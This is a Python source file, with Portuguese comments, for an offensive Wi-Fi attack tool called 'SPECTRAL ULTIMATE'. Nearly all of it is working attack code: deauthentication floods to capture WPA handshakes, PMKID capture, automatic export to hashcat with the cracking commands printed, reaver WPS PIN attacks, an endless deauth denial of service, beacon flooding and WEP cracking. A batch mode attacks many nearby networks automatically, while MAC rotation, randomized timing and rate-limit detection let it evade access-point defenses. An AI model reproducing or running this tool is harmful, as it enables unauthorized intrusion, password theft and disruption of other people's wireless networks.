#!/usr/bin/env python3
"""
SPECTRAL ULTIMATE v1.1 - Enhanced Edition
Adicionadas 6 melhorias críticas:
- Modo Batch configurável
- Export automático para hashcat formats
- MAC rotation por ataque
- Timing randomizado
- Fragmentação inteligente de captures
- Auto-detection de countermeasures
"""

import os
import sys
import time
import json
import gzip
import random
import subprocess
from scapy.all import *
from collections import defaultdict
from datetime import datetime

# ============================================================================
# CONFIGURAÇÃO GLOBAL EXPANDIDA
# ============================================================================

CONFIG = {
    'interface': 'wlan0',
    'output_dir': 'captures',
    'compress': True,
    'skip_captured': True,
    'scan_duration': 25,
    'max_capture_attempts': 3,
    'optimize_live': True,
    
    # NOVOS CONFIGS
    'batch_mode': False,  # Modo batch automático
    'batch_max_targets': 10,  # Máximo de alvos em batch
    'batch_min_clients': 1,  # Mínimo de clientes para batch
    'batch_min_signal': -70,  # Mínimo de sinal (dBm)
    'auto_export_hashcat': True,  # Export automático para hashcat
    'mac_rotation': True,  # Rotaciona MAC entre ataques
    'timing_randomization': True,  # Randomiza timing de deauth
    'fragment_captures': True,  # Fragmenta captures (salva só válido)
    'detect_countermeasures': True  # Detecta bloqueios do AP
}

# ============================================================================
# GERENCIADOR DE CAPTURAS
# ============================================================================

class CaptureManager:
    """Gerencia capturas e metadados com JSON persistente"""
    
    def __init__(self, output_dir):
        self.output_dir = output_dir
        self.metadata_file = os.path.join(output_dir, 'captures.json')
        self.captured = self.load_metadata()
        os.makedirs(output_dir, exist_ok=True)
    
    def load_metadata(self):
        if os.path.exists(self.metadata_file):
            try:
                with open(self.metadata_file, 'r') as f:
                    data = json.load(f)
                    print(f"[+] Carregadas {len(data)} capturas anteriores")
                    return data
            except:
                return {}
        return {}
    
    def save_metadata(self):
        try:
            with open(self.metadata_file, 'w') as f:
                json.dump(self.captured, f, indent=2, sort_keys=True)
        except Exception as e:
            print(f"[!] Erro ao salvar: {e}")
    
    def is_captured(self, bssid):
        return bssid in self.captured
    
    def add_capture(self, bssid, ssid, attack_type, filename, channel, signal, validation=None):
        self.captured[bssid] = {
            'ssid': ssid,
            'attack_type': attack_type,
            'filename': filename,
            'channel': channel,
            'signal': signal,
            'timestamp': datetime.now().isoformat(),
            'validation': validation if validation else {}
        }
        self.save_metadata()
        print(f"[+] Captura registrada no JSON")
    
    def get_stats(self):
        total = len(self.captured)
        today = len([c for c in self.captured.values() 
                    if c['timestamp'].startswith(datetime.now().strftime('%Y-%m-%d'))])
        by_type = defaultdict(int)
        for capture in self.captured.values():
            by_type[capture['attack_type']] += 1
        return {'total': total, 'today': today, 'by_type': dict(by_type)}

# ============================================================================
# VALIDADORES
# ============================================================================

class CaptureValidator:
    @staticmethod
    def validate_handshake(packets):
        eapol_frames = [pkt for pkt in packets if pkt.haslayer(EAPOL)]
        
        if len(eapol_frames) < 4:
            return False, f"Apenas {len(eapol_frames)}/4 frames"
        
        has_msg1 = has_msg2 = False
        anonce = snonce = mic = None
        
        for pkt in eapol_frames:
            try:
                raw = bytes(pkt[EAPOL])
                if len(raw) < 99:
                    continue
                
                current_anonce = raw[17:49]
                current_snonce = raw[49:81] if len(raw) > 81 else None
                current_mic = raw[81:97] if len(raw) > 96 else None
                
                if current_anonce != b'\x00' * 32 and (not current_snonce or current_snonce == b'\x00' * 32):
                    has_msg1 = True
                    anonce = current_anonce
                
                if current_snonce and current_snonce != b'\x00' * 32 and current_mic:
                    has_msg2 = True
                    snonce = current_snonce
                    mic = current_mic
            except:
                continue
        
        if not (has_msg1 and has_msg2):
            return False, "Messages essenciais ausentes"
        
        if not anonce or anonce == b'\x00' * 32:
            return False, "ANonce inválido"
        
        if not snonce or snonce == b'\x00' * 32:
            return False, "SNonce inválido"
        
        if not mic or mic == b'\x00' * 16:
            return False, "MIC inválido"
        
        return True, {
            'anonce': anonce.hex()[:32],
            'snonce': snonce.hex()[:32],
            'mic': mic.hex()[:32],
            'frames': len(eapol_frames)
        }
    
    @staticmethod
    def validate_pmkid(packets):
        if not packets:
            return False, "Nenhum pacote"
        
        for pkt in packets:
            if pkt.haslayer(EAPOL):
                try:
                    raw = bytes(pkt[EAPOL])
                    if b'\xdd' in raw:
                        idx = raw.find(b'\xdd')
                        if len(raw) >= idx + 22:
                            pmkid_candidate = raw[idx+2:idx+18]
                            if pmkid_candidate != b'\x00' * 16:
                                return True, {
                                    'pmkid': pmkid_candidate.hex(),
                                    'length': len(pmkid_candidate)
                                }
                except:
                    continue
        
        return False, "PMKID não encontrado"

# ============================================================================
# NOVO: COUNTERMEASURE DETECTOR
# ============================================================================

class CountermeasureDetector:
    """Detecta bloqueios e rate limiting do AP"""
    
    def __init__(self):
        self.deauth_sent = 0
        self.deauth_times = []
        self.blocked = False
    
    def record_deauth(self):
        """Registra envio de deauth"""
        self.deauth_sent += 1
        self.deauth_times.append(time.time())
        
        # Limpa histórico antigo (últimos 60s)
        cutoff = time.time() - 60
        self.deauth_times = [t for t in self.deauth_times if t > cutoff]
    
    def check_rate_limit(self):
        """Verifica se estamos sendo rate limited"""
        # Se enviamos >100 deauths em 60s e nada aconteceu, provável bloqueio
        if len(self.deauth_times) > 100:
            print("[!] AVISO: Possível rate limiting detectado")
            print("[*] Recomendação: Aguardar 2 minutos ou trocar MAC")
            self.blocked = True
            return True
        return False
    
    def is_blocked(self):
        return self.blocked
    
    def reset(self):
        """Reset após trocar MAC ou aguardar"""
        self.deauth_sent = 0
        self.deauth_times = []
        self.blocked = False

# ============================================================================
# NOVO: EXPORT PARA HASHCAT FORMATS
# ============================================================================

def export_to_hashcat(capture_file, attack_type):
    """Converte captures para formatos hashcat"""
    if not CONFIG['auto_export_hashcat']:
        return None
    
    try:
        if attack_type == 'handshake':
            # WPA/WPA2 -> hashcat mode 22000 (hc22000)
            output_file = capture_file.replace('.cap', '.hc22000').replace('.gz', '')
            
            # Usa hcxpcapngtool se disponível
            result = subprocess.run(['hcxpcapngtool', '-o', output_file, capture_file],
                                   capture_output=True, stderr=subprocess.DEVNULL)
            
            if result.returncode == 0 and os.path.exists(output_file):
                print(f"[+] Exportado para hashcat: {output_file}")
                print(f"    hashcat -m 22000 {output_file} wordlist.txt")
                return output_file
            
        elif attack_type == 'pmkid':
            # PMKID -> hashcat mode 16800
            output_file = capture_file.replace('.cap', '.hc16800')
            
            result = subprocess.run(['hcxpcapngtool', '-o', output_file, capture_file],
                                   capture_output=True, stderr=subprocess.DEVNULL)
            
            if result.returncode == 0 and os.path.exists(output_file):
                print(f"[+] Exportado para hashcat: {output_file}")
                print(f"    hashcat -m 16800 {output_file} wordlist.txt")
                return output_file
        
    except FileNotFoundError:
        print("[!] hcxpcapngtool não encontrado (instale: apt install hcxtools)")
    except Exception as e:
        print(f"[!] Erro ao exportar: {e}")
    
    return None

# ============================================================================
# NOVO: MAC ROTATION
# ============================================================================

def rotate_mac(interface):
    """Rotaciona MAC address"""
    if not CONFIG['mac_rotation']:
        return None
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"[+] MAC rotacionado: {new_mac}")
    return new_mac

# ============================================================================
# OTIMIZAÇÕES KALI LIVE
# ============================================================================

def optimize_live_mode():
    if not CONFIG['optimize_live']:
        return
    
    print("\n[*] Aplicando otimizações Kali Live...")
    
    subprocess.run(['sysctl', '-w', 'vm.swappiness=0'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sync'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['sh', '-c', 'echo 3 > /proc/sys/vm/drop_caches'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    for svc in ['NetworkManager', 'wpa_supplicant', 'ModemManager', 'avahi-daemon']:
        subprocess.run(['systemctl', 'stop', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(['killall', '-9', svc], 
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    subprocess.run(['dmesg', '-n', '1'], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    try:
        os.nice(-20)
    except:
        pass
    
    print("[+] Otimizações aplicadas\n")

def setup_interface(interface):
    subprocess.run(['airmon-ng', 'check', 'kill'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    new_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
    
    subprocess.run(['ip', 'link', 'set', interface, 'down'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'address', new_mac], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'monitor', 'control'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'txpower', 'fixed', '30'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['iw', interface, 'set', 'power_save', 'off'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['ip', 'link', 'set', interface, 'up'], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    print(f"[+] {interface} otimizado (MAC: {new_mac})")

def set_channel(interface, channel):
    subprocess.run(['iw', interface, 'set', 'channel', str(channel)], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ============================================================================
# SCANNING
# ============================================================================

def scan_networks(interface, duration=25):
    networks = {}
    clients = defaultdict(list)
    traffic = defaultdict(int)
    
    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            bssid = pkt[Dot11].addr2
            try:
                ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                channel = int(ord(pkt[Dot11Elt:3].info))
                stats = pkt[Dot11Beacon].network_stats()
                crypto = stats.get('crypto', set())
                signal = pkt.dBm_AntSignal if hasattr(pkt, 'dBm_AntSignal') else -100
                
                if bssid not in networks:
                    networks[bssid] = {
                        'ssid': ssid if ssid else '<HIDDEN>',
                        'channel': channel,
                        'signal': signal,
                        'crypto': crypto
                    }
            except:
                pass
        
        elif pkt.haslayer(Dot11) and pkt.type == 2:
            for bssid in list(networks.keys()):
                if pkt.addr1 == bssid or pkt.addr2 == bssid:
                    client = pkt.addr2 if pkt.addr1 == bssid else pkt.addr1
                    if client != bssid and client not in clients[bssid]:
                        clients[bssid].append(client)
                    traffic[bssid] += 1
    
    print(f"[*] Scanning profundo por {duration}s...")
    
    import threading
    stop = threading.Event()
    
    def hop():
        channels = [1,6,11,3,9,2,7,4,8,5,10]
        while not stop.is_set():
            for ch in channels:
                if stop.is_set():
                    break
                set_channel(interface, ch)
                time.sleep(0.22)
    
    hopper = threading.Thread(target=hop, daemon=True)
    hopper.start()
    
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    
    stop.set()
    hopper.join()
    
    for bssid in networks:
        networks[bssid]['clients'] = clients.get(bssid, [])
        networks[bssid]['traffic'] = traffic.get(bssid, 0)
    
    return networks

# ============================================================================
# ATAQUE 1: HANDSHAKE COM MELHORIAS
# ============================================================================

def calculate_deauth_params(signal, traffic):
    base_count = max(15, min(60, int((abs(signal) - 40) * 1.5)))
    rounds = 3 if traffic > 50 else 5
    
    # NOVO: Timing randomizado
    if CONFIG['timing_randomization']:
        inter = random.uniform(0.05, 0.15)
    else:
        inter = 0.08 if signal > -50 else 0.12
    
    return base_count, rounds, inter

def attack_handshake(target, interface, manager, detector):
    """Captura handshake com todas as melhorias"""
    print(f"\n╔{'='*60}╗")
    print(f"║ ATAQUE 1: Handshake WPA/WPA2 Capture{' '*22}║")
    print(f"╚{'='*60}╝")
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    print(f"[*] Canal: {target['channel']} | Clientes: {len(target['clients'])} | Tráfego: {target['traffic']}")
    
    # NOVO: Rotaciona MAC antes do ataque
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    count, rounds, inter = calculate_deauth_params(target['signal'], target['traffic'])
    print(f"[*] Deauth: {count} pkts/round, {rounds} rounds, {inter:.2f}s interval")
    
    for attempt in range(1, CONFIG['max_capture_attempts'] + 1):
        print(f"\n[*] Tentativa {attempt}/{CONFIG['max_capture_attempts']}")
        
        # NOVO: Checa countermeasures
        if CONFIG['detect_countermeasures'] and detector.check_rate_limit():
            print("[!] Rate limiting detectado, aguardando 120s...")
            time.sleep(120)
            rotate_mac(interface)
            detector.reset()
        
        packets = []
        captured = False
        
        # NOVO: Fragmentação - captura em chunks
        fragments = []
        
        def handler(pkt):
            nonlocal captured
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    packets.append(pkt)
                    
                    # NOVO: Salva fragmento a cada 10 pacotes (se config ativo)
                    if CONFIG['fragment_captures'] and len(packets) % 10 == 0:
                        fragments.append(packets.copy())
                    
                    print(f"    [+] EAPOL [{len(packets)}]", end='\r')
                    
                    if len(packets) >= 4:
                        valid, result = CaptureValidator.validate_handshake(packets)
                        if valid:
                            print(f"\n    [+] Handshake VALIDADO em tempo real!")
                            captured = True
                            return True
        
        import threading
        done = threading.Event()
        
        def sniff_thread():
            sniff(iface=interface, prn=handler, timeout=60, 
                  stop_filter=lambda x: captured, store=False)
            done.set()
        
        sniffer = threading.Thread(target=sniff_thread, daemon=True)
        sniffer.start()
        
        time.sleep(2)
        
        # Deauth com timing randomizado
        print("    [!] Enviando deauth adaptativo...")
        
        for round_num in range(rounds):
            # NOVO: Timing randomizado entre rounds
            if CONFIG['timing_randomization']:
                round_delay = random.uniform(0.3, 0.7)
            else:
                round_delay = 0.4
            
            frame_bc = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                        addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame_bc, iface=interface, count=count//2, inter=inter, verbose=0)
            
            detector.record_deauth()
            
            if target['clients']:
                for client in target['clients'][:3]:
                    f1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    f2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, 
                                         addr3=target['bssid'])/Dot11Deauth(reason=7)
                    sendp([f1, f2], iface=interface, count=count//4, inter=inter, verbose=0)
                    detector.record_deauth()
            
            time.sleep(round_delay)
        
        done.wait()
        
        if captured:
            valid, result = CaptureValidator.validate_handshake(packets)
            
            if valid:
                # NOVO: Salva apenas handshake validado (não fragmentos)
                filename_base = f"hs_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                
                if CONFIG['compress']:
                    filename = os.path.join(manager.output_dir, f"{filename_base}.cap.gz")
                    with gzip.open(filename, 'wb') as f:
                        wrpcap(f, packets)
                else:
                    filename = os.path.join(manager.output_dir, f"{filename_base}.cap")
                    wrpcap(filename, packets)
                
                manager.add_capture(
                    target['bssid'], target['ssid'], 'handshake',
                    filename, target['channel'], target['signal'], result
                )
                
                print(f"\n[+++] HANDSHAKE CAPTURADO E VALIDADO")
                print(f"[+++] Arquivo: {filename}")
                print(f"\n[*] Validação:")
                print(f"    ANonce: {result['anonce']}...")
                print(f"    SNonce: {result['snonce']}...")
                print(f"    MIC: {result['mic']}...")
                print(f"    Frames EAPOL: {result['frames']}")
                
                # NOVO: Export automático para hashcat
                exported = export_to_hashcat(filename, 'handshake')
                
                return True
            else:
                print(f"\n    [-] Validação falhou: {result}")
        
        if attempt < CONFIG['max_capture_attempts']:
            print(f"    [*] Aguardando 5s antes da próxima tentativa...")
            time.sleep(5)
    
    print("\n[-] Falha após todas as tentativas")
    return False

# ============================================================================
# ATAQUE 2: PMKID COM MELHORIAS
# ============================================================================

def attack_pmkid(target, interface, manager, detector):
    print(f"\n╔{'='*60}╗")
    print(f"║ ATAQUE 2: PMKID Attack{' '*37}║")
    print(f"╚{'='*60}╝")
    print(f"\n[*] Alvo: {target['ssid']} ({target['bssid']})")
    
    # NOVO: Rotaciona MAC
    if CONFIG['mac_rotation']:
        rotate_mac(interface)
        time.sleep(1)
    
    set_channel(interface, target['channel'])
    time.sleep(1)
    
    all_packets = []
    
    for attempt in range(1, 6):
        print(f"\n[*] Tentativa {attempt}/5")
        
        pmkid_packets = []
        
        def handler(pkt):
            if pkt.haslayer(EAPOL):
                if pkt[Dot11].addr3 == target['bssid'] or pkt[Dot11].addr2 == target['bssid']:
                    pmkid_packets.append(pkt)
                    all_packets.append(pkt)
        
        print("    [*] Enviando association requests...")
        for _ in range(3):
            assoc = RadioTap()/Dot11(addr1=target['bssid'], addr2="00:11:22:33:44:55", 
                                     addr3=target['bssid'])/Dot11AssoReq()
            sendp(assoc, iface=interface, verbose=0)
            time.sleep(0.5)
        
        sniff(iface=interface, prn=handler, timeout=10, store=False)
        
        if pmkid_packets:
            valid, result = CaptureValidator.validate_pmkid(pmkid_packets)
            
            if valid:
                filename_base = f"pmkid_{target['bssid'].replace(':', '')}_{target['ssid'].replace(' ', '_')[:15]}"
                filename = os.path.join(manager.output_dir, f"{filename_base}.cap")
                wrpcap(filename, pmkid_packets)
                
                manager.add_capture(
                    target['bssid'], target['ssid'], 'pmkid',
                    filename, target['channel'], target['signal'], result
                )
                
                print(f"\n[+++] PMKID CAPTURADO E VALIDADO")
                print(f"[+++] Arquivo: {filename}")
                print(f"\n[*] Validação:")
                print(f"    PMKID: {result['pmkid']}")
                
                # NOVO: Export para hashcat
                exported = export_to_hashcat(filename, 'pmkid')
                
                return True
    
    print("\n[-] PMKID não obtido")
    return False

# ============================================================================
# NOVO: MODO BATCH INTELIGENTE
# ============================================================================

def batch_attack_mode(targets, interface, manager, detector):
    """Ataca múltiplos alvos automaticamente"""
    print(f"\n╔{'='*60}╗")
    print(f"║ MODO BATCH: Ataque Automático{' '*30}║")
    print(f"╚{'='*60}╝")
    
    # Filtra alvos por critérios
    filtered = []
    for bssid, info in targets:
        if len(info['clients']) >= CONFIG['batch_min_clients'] and \
           info['signal'] >= CONFIG['batch_min_signal']:
            filtered.append((bssid, info))
    
    # Limita ao máximo configurado
    filtered = filtered[:CONFIG['batch_max_targets']]
    
    print(f"\n[*] {len(filtered)} alvos selecionados para batch")
    print(f"[*] Critérios: clientes>={CONFIG['batch_min_clients']}, sinal>={CONFIG['batch_min_signal']}dBm\n")
    
    success = 0
    failed = 0
    
    for i, (bssid, info) in enumerate(filtered, 1):
        target = {
            'bssid': bssid,
            'ssid': info['ssid'],
            'channel': info['channel'],
            'signal': info['signal'],
            'crypto': info['crypto'],
            'clients': info['clients'],
            'traffic': info['traffic']
        }
        
        print(f"\n[{i}/{len(filtered)}] Atacando: {target['ssid']}")
        
        # Tenta handshake primeiro
        result = attack_handshake(target, interface, manager, detector)
        
        if result:
            success += 1
        else:
            # Se falhar, tenta PMKID
            print("[*] Tentando PMKID como fallback...")
            result_pmkid = attack_pmkid(target, interface, manager, detector)
            if result_pmkid:
                success += 1
            else:
                failed += 1
        
        # Delay entre ataques
        if i < len(filtered):
            print(f"\n[*] Aguardando 10s antes do próximo alvo...")
            time.sleep(10)
    
    print(f"\n╔{'='*60}╗")
    print(f"║ BATCH COMPLETO{' '*45}║")
    print(f"╚{'='*60}╝")
    print(f"\n  Sucessos: {success}/{len(filtered)}")
    print(f"  Falhas: {failed}/{len(filtered)}")
    print(f"  Taxa: {(success/len(filtered)*100) if len(filtered) > 0 else 0:.1f}%")

# ============================================================================
# ATAQUES RESTANTES (simplificados)
# ============================================================================

def attack_wps(target, interface, manager, detector):
    print(f"\n[*] WPS PIN Attack: {target['ssid']}")
    try:
        subprocess.run(['reaver', '-i', interface, '-b', target['bssid'], 
                       '-c', str(target['channel']), '-K', '1', '-vv'], timeout=120)
    except:
        pass
    return False

def attack_evil_twin(target, interface, manager, detector):
    print(f"\n[*] Evil Twin: {target['ssid']}")
    print("[*] Funcionalidade reduzida - requer configuração manual")
    return False

def attack_deauth_dos(target, interface, manager, detector):
    print(f"\n[*] Deauth DoS: {target['ssid']}")
    set_channel(interface, target['channel'])
    count = 0
    try:
        while True:
            frame = RadioTap()/Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=target['bssid'], 
                                    addr3=target['bssid'])/Dot11Deauth(reason=7)
            sendp(frame, iface=interface, count=10, inter=0.05, verbose=0)
            count += 10
            print(f"\r[*] Pacotes: {count}", end='')
            time.sleep(0.3)
    except KeyboardInterrupt:
        print(f"\n[!] Interrompido após {count} pacotes")
    return False

def attack_beacon_flood(target, interface, manager, detector):
    print(f"\n[*] Beacon Flood no canal {target['channel']}")
    set_channel(interface, target['channel'])
    count = 0
    try:
        while True:
            fake_ssid = f"FreeWiFi_{random.randint(1000,9999)}"
            fake_mac = ':'.join([f'{random.randint(0,255):02x}' for _ in range(6)])
            dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=fake_mac, addr3=fake_mac)
            beacon = Dot11Beacon()
            essid = Dot11Elt(ID='SSID', info=fake_ssid)
            frame = RadioTap()/dot11/beacon/essid
            sendp(frame, iface=interface, verbose=0)
            count += 1
            if count % 50 == 0:
                print(f"\r[*] APs: {count}", end='')
            time.sleep(0.1)
    except KeyboardInterrupt:
        print(f"\n[!] Interrompido após {count} SSIDs")
    return False

def attack_wep(target, interface, manager, detector):
    print(f"\n[*] WEP Cracking: {target['ssid']}")
    if 'WEP' not in str(target['crypto']):
        print("[-] Não é WEP!")
        return False
    set_channel(interface, target['channel'])
    out = os.path.join(manager.output_dir, f"wep_{target['bssid'].replace(':','')}")
    proc = subprocess.Popen(['airodump-ng', '-c', str(target['channel']), 
                            '--bssid', target['bssid'], '-w', out, interface])
    input("[*] ENTER para parar...")
    proc.kill()
    subprocess.run(['aircrack-ng', f"{out}-01.cap"])
    return False

# ============================================================================
# MENU DE ATAQUES
# ============================================================================

ATTACKS = {
    '1': {'name': 'Handshake WPA/WPA2', 'function': attack_handshake},
    '2': {'name': 'PMKID Attack', 'function': attack_pmkid},
    '3': {'name': 'WPS PIN Attack', 'function': attack_wps},
    '4': {'name': 'Evil Twin', 'function': attack_evil_twin},
    '5': {'name': 'Deauth DoS', 'function': attack_deauth_dos},
    '6': {'name': 'Beacon Flood', 'function': attack_beacon_flood},
    '7': {'name': 'WEP Cracking', 'function': attack_wep},
    'B': {'name': 'MODO BATCH (Automático)', 'function': None}  # Especial
}

# ============================================================================
# MAIN
# ============================================================================

def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║               SPECTRAL ULTIMATE v1.1                         ║
║          Enhanced with 6 Critical Improvements               ║
║                                                              ║
║  [✓] Modo Batch Configurável                                ║
║  [✓] Export Automático para Hashcat                         ║
║  [✓] MAC Rotation por Ataque                                ║
║  [✓] Timing Randomizado                                     ║
║  [✓] Fragmentação Inteligente                               ║
║  [✓] Detecção de Countermeasures                            ║
║                                                              ║
║  7 Ataques + Modo Batch Automático                          ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    if os.geteuid() != 0:
        print("[-] Execute como root")
        sys.exit(1)
    
    # Inicialização
    optimize_live_mode()
    manager = CaptureManager(CONFIG['output_dir'])
    detector = CountermeasureDetector()  # NOVO
    
    stats = manager.get_stats()
    print(f"[*] Capturas totais: {stats['total']}")
    print(f"[*] Capturas hoje: {stats['today']}")
    if stats['by_type']:
        print(f"[*] Por tipo: {stats['by_type']}")
    
    interface = CONFIG['interface']
    setup_interface(interface)
    time.sleep(2)
    
    # Scanning
    networks = scan_networks(interface, duration=CONFIG['scan_duration'])
    
    if not networks:
        print("\n[-] Nenhuma rede detectada")
        return
    
    # Filtra capturadas
    available = {}
    skipped = []
    
    for bssid, info in networks.items():
        if CONFIG['skip_captured'] and manager.is_captured(bssid):
            skipped.append(info['ssid'])
        else:
            available[bssid] = info
    
    if skipped:
        print(f"\n[*] Puladas {len(skipped)} redes já capturadas")
    
    if not available:
        print("\n[*] Todas já capturadas!")
        return
    
    # Ordena
    targets = sorted(available.items(), 
                    key=lambda x: (len(x[1]['clients']), x[1]['traffic'], x[1]['signal']), 
                    reverse=True)
    
    # Lista
    print(f"\n[*] {len(targets)} alvos disponíveis:\n")
    
    for i, (bssid, info) in enumerate(targets, 1):
        crypto_str = ', '.join(str(c) for c in info['crypto']) if info['crypto'] else 'OPEN'
        clients_str = f"{len(info['clients'])}cli"
        traffic_icon = "🔥" if info['traffic'] > 100 else "📡" if info['traffic'] > 10 else "💤"
        
        print(f"{i:2}. {info['ssid'][:24]:24} | {bssid} | Ch{info['channel']:2} | {info['signal']:4}dBm | {clients_str:4} | {traffic_icon} | {crypto_str}")
    
    # NOVO: Opção de modo batch
    print("\n[?] Modo de operação:")
    print("  I - Interativo (seleciona alvo)")
    print("  B - Batch (ataque automático)")
    
    mode = input("\n>>> ").strip().upper()
    
    if mode == 'B':
        # MODO BATCH
        batch_attack_mode(targets, interface, manager, detector)
    else:
        # MODO INTERATIVO
        try:
            choice = int(input("\n[?] Selecione alvo: ")) - 1
            if not 0 <= choice < len(targets):
                return
        except:
            return
        
        bssid, info = targets[choice]
        
        target = {
            'bssid': bssid,
            'ssid': info['ssid'],
            'channel': info['channel'],
            'signal': info['signal'],
            'crypto': info['crypto'],
            'clients': info['clients'],
            'traffic': info['traffic']
        }
        
        print(f"\n[*] Alvo: {target['ssid']}")
        print(f"\n╔{'='*60}╗")
        print(f"║ SELECIONE O ATAQUE{' '*41}║")
        print(f"╚{'='*60}╝\n")
        
        for key, attack in ATTACKS.items():
            print(f"{key}. {attack['name']}")
        
        attack_choice = input("\n[?] Ataque: ").strip()
        
        if attack_choice in ATTACKS and ATTACKS[attack_choice]['function']:
            attack_func = ATTACKS[attack_choice]['function']
            attack_func(target, interface, manager, detector)
            
            stats = manager.get_stats()
            print(f"\n[*] Total: {stats['total']} | Hoje: {stats['today']}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrompido")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Erro: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
